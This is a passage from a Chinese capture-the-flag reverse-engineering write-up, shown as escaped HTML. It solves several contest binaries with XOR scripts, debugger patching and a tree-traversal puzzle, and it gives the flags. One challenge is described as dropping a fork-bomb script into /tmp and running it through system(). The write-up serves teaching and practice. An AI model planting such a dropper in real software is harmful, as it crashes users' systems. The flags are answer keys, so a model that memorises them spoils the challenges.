&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qwq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qwq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;qaq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#qwq = {DT_n3re}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#qaq = onuF{iT_3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;解出后，根据字符串的提示，以及题目的提示，知道这是树的中序和后序遍历&lt;/p&gt;
&lt;p&gt;那么需要求出前序遍历&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;中序：noiFu{DT_n3re}&lt;/p&gt;
&lt;p&gt;后序：onuF{iT_3}ernD&lt;/p&gt;
&lt;p&gt;求解前序的过程是手写的，这里不再提出&lt;/p&gt;
&lt;p&gt;前序：Dino{Fun_Tr3e}&lt;/p&gt;
&lt;p&gt;即为flag&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;题目名称papertiger&#34;&gt;题目名称：PaperTiger!!!
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Nameless&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;扔进IDA,发现找不到main函数，shift+f12查看字符串,找到关键字符串，双击跟进
&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123364-1960724373.png&#34;
	width=&#34;585&#34;
	height=&#34;101&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123364-1960724373_hu18117255318509038788.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123364-1960724373_hu362423523080195111.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;579&#34;
		data-flex-basis=&#34;1390px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123899-1506405574.png&#34;
	width=&#34;632&#34;
	height=&#34;162&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123899-1506405574_hu10527989912337154121.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192123899-1506405574_hu4447595842539897667.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;390&#34;
		data-flex-basis=&#34;936px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;鼠标放在这里，按ctrl+X查看交叉引用，即查看哪里用到了这个字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192124674-1914503306.png&#34;
	width=&#34;737&#34;
	height=&#34;386&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192124674-1914503306_hu8959083234814485694.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192124674-1914503306_hu1703397083182161662.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;458px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;发现F5不好使了，提示sp指针有问题。根据参考资料，调整最后面的堆栈指针&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125101-827646255.png&#34;
	width=&#34;527&#34;
	height=&#34;144&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125101-827646255_hu378959572957406948.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125101-827646255_hu11593251256030908645.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;365&#34;
		data-flex-basis=&#34;878px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125451-861924593.png&#34;
	width=&#34;514&#34;
	height=&#34;146&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125451-861924593_hu6365706340130277558.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192125451-861924593_hu11829353133594250645.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;352&#34;
		data-flex-basis=&#34;844px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;此时便可F5成功，审计代码知，就是简单的xor而已&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126194-1430764313.png&#34;
	width=&#34;644&#34;
	height=&#34;318&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126194-1430764313_hu13232506934423456900.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126194-1430764313_hu13173536041499944995.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;202&#34;
		data-flex-basis=&#34;486px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;写脚本计算出来即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;key = [0x0, 0x1, 0x2, 0x3, 0x5, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s2 = &amp;#34;fmcd~qn6=VKT|l~jbE#tqgIE)^roa&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag =&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;for i in range(len(key)):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    flag += chr(ord(s2[i])^key[i])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(flag)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;所以如题，真的是个纸老虎:)&lt;/p&gt;
&lt;h2 id=&#34;题目名称你不会真的要用ce吧&#34;&gt;题目名称：你不会真的要用CE吧
&lt;/h2&gt;&lt;p&gt;出题人：&lt;strong&gt;Gyan&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IDA打开,根据提示，关闭ASLR(如图）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126758-3241695.png&#34;
	width=&#34;775&#34;
	height=&#34;266&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126758-3241695_hu9602703502148516053.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192126758-3241695_hu2751375821210382690.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;291&#34;
		data-flex-basis=&#34;699px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后打开od，搜索字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127251-832348476.png&#34;
	width=&#34;771&#34;
	height=&#34;116&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127251-832348476_hu8195574672422802121.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127251-832348476_hu10820516967502930129.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;664&#34;
		data-flex-basis=&#34;1595px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;去IDA，按G，随便选上面的一个地址跳转，即可来到主函数&lt;/p&gt;
&lt;p&gt;找到关键代码部分&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127595-69046226.png&#34;
	width=&#34;493&#34;
	height=&#34;110&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127595-69046226_hu14656344004967533725.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127595-69046226_hu4400085571066004014.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;448&#34;
		data-flex-basis=&#34;1075px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看这句话的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127988-1380737118.png&#34;
	width=&#34;642&#34;
	height=&#34;91&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127988-1380737118_hu16051122531599295057.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192127988-1380737118_hu16349113506321896327.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;705&#34;
		data-flex-basis=&#34;1693px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在od中，按ctrl+g跳转到该地址，并按f2下断点,然后f9运行程序&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128389-1140476233.png&#34;
	width=&#34;596&#34;
	height=&#34;94&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128389-1140476233_hu3821524993240715787.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128389-1140476233_hu1155880371009903185.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;634&#34;
		data-flex-basis=&#34;1521px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以发现程序停在了断点处，修改旁边的标志位，使得跳转不成立&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128707-1479794058.png&#34;
	width=&#34;343&#34;
	height=&#34;124&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128707-1479794058_hu14073362743092914087.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192128707-1479794058_hu4357638001960889309.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;276&#34;
		data-flex-basis=&#34;663px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后再按一下f9，运行程序，点击确定，发现flag已经出来了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192129222-380748232.png&#34;
	width=&#34;657&#34;
	height=&#34;391&#34;
	srcset=&#34;https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192129222-380748232_hu219927094526105303.png 480w, https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/1858293-20201115192129222-380748232_hu4358974371205086567.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;168&#34;
		data-flex-basis=&#34;403px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;题目名称fork-bomb-bomb-bomb&#34;&gt;题目名称：fork bomb bomb bomb！！！
&lt;/h2&gt;&lt;h3 id=&#34;着手静态&#34;&gt;着手静态
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;载入IDA 来到主函数进行分析&lt;/li&gt;
&lt;li&gt;F5查看伪代码&lt;/li&gt;
&lt;li&gt;找到回车前的输出字符串&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;熟悉C语言就能看出，这里向/tmp目录里面输出了一个文件（.virus）&lt;/li&gt;
&lt;li&gt;补充linux里的/tmp目录特点：任何人都可以进行读写，有些linux发行版会在关机后清空/tmp目录。关于linux的使用请参考相关书籍如：鸟哥的linux私房菜&lt;/li&gt;
&lt;li&gt;利用system()函数执行了/tmp里的文件，由于linux的mask,/tmp/.virus这个shell脚本是没有执行权限的，所以使用bash调用&lt;/li&gt;
&lt;li&gt;/tmp/.virus脚本的内容是一个很经典的fork炸弹，百度就能查到&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;这个程序的恶意代码和关键代码的耦合性不高，所以咱们能有好几种方法绕过恶意代码，接下来我们尝试使用静态patch和动态调试绕过恶意代码拿到flag，静态逆向写逆向脚本这里不做讨论&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;dwhile&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                                   &lt;span class=&#34;c1&#34;&gt;// 这个无线循环的结束条件是下面的goto
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
